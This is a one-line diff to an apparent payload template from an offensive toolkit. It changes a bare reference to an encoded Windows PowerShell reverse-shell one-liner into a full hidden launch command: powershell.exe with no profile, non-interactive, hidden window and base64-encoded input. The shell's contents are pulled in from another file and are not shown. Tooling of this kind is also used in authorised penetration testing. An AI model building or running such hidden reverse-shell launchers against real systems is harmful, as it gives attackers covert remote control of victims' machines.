@@ -1,1 +1,1 @@
-<% echo $(esh payloads/revshell-windows-powershell-oneliner) | python helper_scripts/encode.py --base64pwsh %>
+powershell.exe -NoP -NonI -W Hidden -Enc <% echo $(esh payloads/revshell-windows-powershell-oneliner) | python helper_scripts/encode.py --base64pwsh %>
